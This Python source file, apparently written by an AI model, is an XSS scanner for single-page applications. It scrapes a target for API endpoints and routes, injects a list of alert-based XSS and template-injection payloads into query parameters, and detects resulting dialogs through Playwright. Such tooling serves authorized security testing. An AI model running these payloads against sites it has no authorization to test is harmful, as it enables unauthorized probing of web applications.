#!/usr/bin/env python3
"""
Modern SPA XSS Scanner Module
For Single Page Applications and modern JavaScript frameworks
Author: AI Assistant
Version: 1.0
"""

import requests
import re
import urllib.parse
import time
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

class ModernSPAScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Modern SPA XSS payloads
        self.payloads = {
            'dom_based': [
                '<script>alert("XSS_DOM_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_DOM_CONFIRMED")>',
                '<svg onload=alert("XSS_DOM_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_DOM_CONFIRMED\')">',
                'javascript:alert("XSS_DOM_CONFIRMED")',
                'data:text/html,<script>alert("XSS_DOM_CONFIRMED")</script>'
            ],
            'react_based': [
                '{{constructor.constructor("alert(\\"XSS_REACT_CONFIRMED\\")")()}}',
                '{alert("XSS_REACT_CONFIRMED")}',
                '${alert("XSS_REACT_CONFIRMED")}',
                '<script dangerouslySetInnerHTML={{__html: "alert(\\"XSS_REACT_CONFIRMED\\")"}}>',
                '{eval("alert(\\"XSS_REACT_CONFIRMED\\")")}'
            ],
            'vue_based': [
                '{{constructor.constructor("alert(\\"XSS_VUE_CONFIRMED\\")")()}}',
                '{alert("XSS_VUE_CONFIRMED")}',
                'v-on:click="alert(\'XSS_VUE_CONFIRMED\')"',
                'v-bind:onclick="alert(\'XSS_VUE_CONFIRMED\')"'
            ],
            'angular_based': [
                '{{constructor.constructor("alert(\\"XSS_ANGULAR_CONFIRMED\\")")()}}',
                '{alert("XSS_ANGULAR_CONFIRMED")}',
                '(click)="alert(\'XSS_ANGULAR_CONFIRMED\')"',
                '[innerHTML]="alert(\'XSS_ANGULAR_CONFIRMED\')"'
            ],
            'json_injection': [
                '{"test": "<script>alert(\\"XSS_JSON_CONFIRMED\\")</script>"}',
                '{"test": "javascript:alert(\\"XSS_JSON_CONFIRMED\\")"}',
                '{"test": "<img src=x onerror=alert(\\"XSS_JSON_CONFIRMED\\")>"}'
            ]
        }
        
        self.vulnerabilities = []
        self.browser = None
        self.playwright = None
        self.browser_context = None
    
    def scan(self):
        """Main scanning method for modern SPA websites"""
        print(f"[MODERN SPA] Starting modern SPA XSS scan for {self.target_url}")
        
        # Phase 1: API Reconnaissance
        api_data = self._api_reconnaissance()
        
        # Phase 2: Client-side Reconnaissance
        client_data = self._client_side_reconnaissance()
        
        # Phase 3: Browser-based Testing
        vulnerabilities = []
        if PLAYWRIGHT_AVAILABLE:
            vulnerabilities = self._browser_based_testing(api_data, client_data)
        else:
            print("[MODERN SPA] Playwright not available, using basic testing")
            vulnerabilities = self._basic_testing(api_data, client_data)
        
        return vulnerabilities
    
    def _api_reconnaissance(self):
        """Reconnaissance for API endpoints and parameters"""
        print("[MODERN SPA] Starting API reconnaissance...")
        
        api_endpoints = set()
        api_parameters = set()
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if response.status_code == 200:
                html_content = response.text
                
                # Extract API endpoints from JavaScript
                api_patterns = [
                    r'fetch\(["\']([^"\']+)["\']',
                    r'axios\.(?:get|post|put|delete)\(["\']([^"\']+)["\']',
                    r'XMLHttpRequest.*open\(["\'](?:GET|POST|PUT|DELETE)["\'],\s*["\']([^"\']+)["\']',
                    r'\.post\(["\']([^"\']+)["\']',
                    r'\.get\(["\']([^"\']+)["\']',
                    r'/api/[^"\']+',
                    r'/v\d+/[^"\']+',
                    r'/graphql',
                    r'/rest/[^"\']+'
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    for match in matches:
                        if match and not match.startswith('#'):
                            full_url = urljoin(self.target_url, match)
                            api_endpoints.add(full_url)
                
                # Extract API parameters
                param_patterns = [
                    r'params\.(\w+)',
                    r'data\.(\w+)',
                    r'payload\.(\w+)',
                    r'body\.(\w+)',
                    r'query\.(\w+)'
                ]
                
                for pattern in param_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    api_parameters.update(matches)
        
        except Exception as e:
            print(f"[MODERN SPA] API reconnaissance error: {str(e)}")
        
        print(f"[MODERN SPA] Found {len(api_endpoints)} API endpoints, {len(api_parameters)} API parameters")
        
        return {
            'api_endpoints': list(api_endpoints),
            'api_parameters': list(api_parameters)
        }
    
    def _client_side_reconnaissance(self):
        """Reconnaissance for client-side routes and parameters"""
        print("[MODERN SPA] Starting client-side reconnaissance...")
        
        routes = set()
        client_parameters = set()
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if response.status_code == 200:
                html_content = response.text
                
                # Extract client-side routes
                route_patterns = [
                    r'router\.push\(["\']([^"\']+)["\']',
                    r'history\.pushState\([^,]+,\s*["\']([^"\']+)["\']',
                    r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
                    r'location\.pathname\s*=\s*["\']([^"\']+)["\']',
                    r'route\s*:\s*["\']([^"\']+)["\']',
                    r'path\s*:\s*["\']([^"\']+)["\']'
                ]
                
                for pattern in route_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    for match in matches:
                        if match and not match.startswith('#'):
                            full_url = urljoin(self.target_url, match)
                            routes.add(full_url)
                
                # Extract client-side parameters
                client_param_patterns = [
                    r'useParams\(\)\.(\w+)',
                    r'props\.(\w+)',
                    r'state\.(\w+)',
                    r'this\.(\w+)',
                    r'route\.params\.(\w+)'
                ]
                
                for pattern in client_param_patterns:
                    matches = re.findall(pattern, html_content, re.IGNORECASE)
                    client_parameters.update(matches)
        
        except Exception as e:
            print(f"[MODERN SPA] Client-side reconnaissance error: {str(e)}")
        
        print(f"[MODERN SPA] Found {len(routes)} client routes, {len(client_parameters)} client parameters")
        
        return {
            'routes': list(routes),
            'client_parameters': list(client_parameters)
        }
    
    def _browser_based_testing(self, api_data, client_data):
        """Browser-based testing using Playwright"""
        print("[MODERN SPA] Starting browser-based testing...")
        
        vulnerabilities = []
        
        if not self._init_browser():
            print("[MODERN SPA] Failed to initialize browser")
            return vulnerabilities
        
        try:
            # Test API endpoints
            for endpoint in api_data['api_endpoints']:
                for param in api_data['api_parameters']:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = self._test_api_endpoint(endpoint, param, payload, payload_type)
                            if vuln:
                                vulnerabilities.append(vuln)
            
            # Test client-side routes
            for route in client_data['routes']:
                for param in client_data['client_parameters']:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = self._test_client_route(route, param, payload, payload_type)
                            if vuln:
                                vulnerabilities.append(vuln)
        
        finally:
            self._close_browser()
        
        return vulnerabilities
    
    def _basic_testing(self, api_data, client_data):
        """Basic testing without browser (fallback)"""
        print("[MODERN SPA] Starting basic testing...")
        
        vulnerabilities = []
        
        # Test API endpoints with basic requests
        for endpoint in api_data['api_endpoints']:
            for param in api_data['api_parameters']:
                for payload_type, payloads in self.payloads.items():
                    for payload in payloads:
                        vuln = self._test_api_endpoint_basic(endpoint, param, payload, payload_type)
                        if vuln:
                            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_api_endpoint(self, endpoint, param, payload, payload_type):
        """Test API endpoint using browser"""
        try:
            page = self.browser_context.new_page()
            
            # Set up dialog handler
            dialog_handled = False
            alert_message = ""
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message
                dialog_handled = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            # Test GET request
            test_url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            page.goto(test_url, timeout=10000)
            time.sleep(2)
            
            if dialog_handled and 'XSS' in alert_message:
                page.close()
                return {
                    'type': 'dom_based_xss',
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'method': 'GET',
                    'alert_message': alert_message,
                    'confidence': 'high'
                }
            
            page.close()
            return None
        
        except Exception as e:
            print(f"[MODERN SPA] Error testing API endpoint: {str(e)}")
            return None
    
    def _test_client_route(self, route, param, payload, payload_type):
        """Test client-side route using browser"""
        try:
            page = self.browser_context.new_page()
            
            # Set up dialog handler
            dialog_handled = False
            alert_message = ""
            
            def handle_dialog(dialog):
                nonlocal dialog_handled, alert_message
                dialog_handled = True
                alert_message = dialog.message
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            # Navigate to route with payload
            test_url = f"{route}?{param}={urllib.parse.quote(payload)}"
            page.goto(test_url, timeout=10000)
            time.sleep(3)
            
            if dialog_handled and 'XSS' in alert_message:
                page.close()
                return {
                    'type': 'dom_based_xss',
                    'route': route,
                    'parameter': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'alert_message': alert_message,
                    'confidence': 'high'
                }
            
            page.close()
            return None
        
        except Exception as e:
            print(f"[MODERN SPA] Error testing client route: {str(e)}")
            return None
    
    def _test_api_endpoint_basic(self, endpoint, param, payload, payload_type):
        """Test API endpoint using basic requests"""
        try:
            # Test GET request
            test_url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=self.timeout)
            
            if payload in response.text and 'XSS' in payload:
                return {
                    'type': 'reflected_xss',
                    'endpoint': endpoint,
                    'parameter': param,
                    'payload': payload,
                    'payload_type': payload_type,
                    'method': 'GET',
                    'confidence': 'medium'
                }
            
            return None
        
        except Exception as e:
            print(f"[MODERN SPA] Error testing API endpoint: {str(e)}")
            return None
    
    def _init_browser(self):
        """Initialize browser"""
        try:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(
                headless=False,
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            self.browser_context = self.browser.new_context()
            return True
        except Exception as e:
            print(f"[MODERN SPA] Browser init error: {str(e)}")
            return False
    
    def _close_browser(self):
        """Close browser"""
        try:
            if self.browser_context:
                self.browser_context.close()
            if self.browser:
                self.browser.close()
            if self.playwright:
                self.playwright.stop()
        except Exception as e:
            print(f"[MODERN SPA] Browser close error: {str(e)}")